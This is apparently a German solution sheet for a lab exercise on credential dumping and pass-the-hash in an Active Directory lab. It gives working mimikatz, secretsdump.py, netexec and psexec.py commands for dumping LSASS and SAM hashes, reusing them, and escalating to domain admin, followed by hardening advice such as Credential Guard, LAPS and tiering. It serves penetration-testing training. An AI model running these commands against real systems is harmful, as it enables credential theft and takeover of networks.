# Lösung – Übung 08: Credential Dumping & PtH

`<HOST>` = kompromittierter Host (lokal Admin `Administrator`), `<DC>` = DC.

## 1. Dumpen

**mimikatz (auf dem Windows-Host, als Admin):**
```
privilege::debug
sekurlsa::logonpasswords          # LSASS: NTLM/Klartext angemeldeter User
lsadump::sam                      # lokale SAM-Hashes
```
**Remote (Kali):**
```bash
secretsdump.py lab.local/Administrator:'Passwort'@<HOST>
# oder per Hash:
secretsdump.py -hashes :<NT> Administrator@<HOST>
# netexec:
netexec smb <HOST> -u Administrator -p 'Passwort' --sam --lsa
```

## 2. Privilegierten Account finden

In der LSASS-Ausgabe nach **Domänen-Admins**/privilegierten Usern suchen (z. B. `LAB\da_admin` mit NT-Hash) – wenn sich so jemand am Host angemeldet hat, liegt sein Credential im Speicher = **Jackpot**.

## 3. Pass-the-Hash

```bash
netexec smb <ZIEL2> -u da_admin -H <NT> -d lab.local
psexec.py -hashes :<NT> lab.local/da_admin@<ZIEL2>
```

## 4. Weg zum DA

Mit einem Domänen-Admin-Hash/-Credential: Zugriff auf den **DC** → DCSync/Domain Dominance (Übung 09). Oder schrittweise: Host → LSASS → nächster Account → nächster Host (Lateral Movement) bis ein DA-Credential fällt.

## 5. Schutz & Kritikalität lokaler Admins

- **Credential Guard** isoliert LSASS (VBS) → `sekurlsa::logonpasswords` scheitert.
- **LSA Protection (RunAsPPL)**, **LAPS** (eindeutige lokale Admin-PW → kein PtH-Reuse), **Tiering** (DA loggt sich **nie** auf Tier-2-Hosts ein → kein DA-Credential im Speicher), **EDR**.
- Lokaler Admin = Zugriff auf alle Credentials im Speicher → extrem kritisch.

## Härtung

Credential Guard + RunAsPPL, LAPS, Tiering/PAW, NTLM reduzieren, EDR mit LSASS-Zugriffs-Alerts.

## Häufige Fehler / Troubleshooting

- **mimikatz von AV geblockt:** Lab-AV aus/Ausnahme; Credential Guard verhindert Dump (= Abwehr wirkt).
- **secretsdump „access denied":** kein lokaler Admin → erst PrivEsc.
- **PtH scheitert:** NT-Hash-Feld/`-d domain`/`--local-auth` je nach lokalem vs. Domänen-Account.
- **Kein DA im LSASS:** gutes Tiering → dann über andere Pfade (BloodHound) weiter.
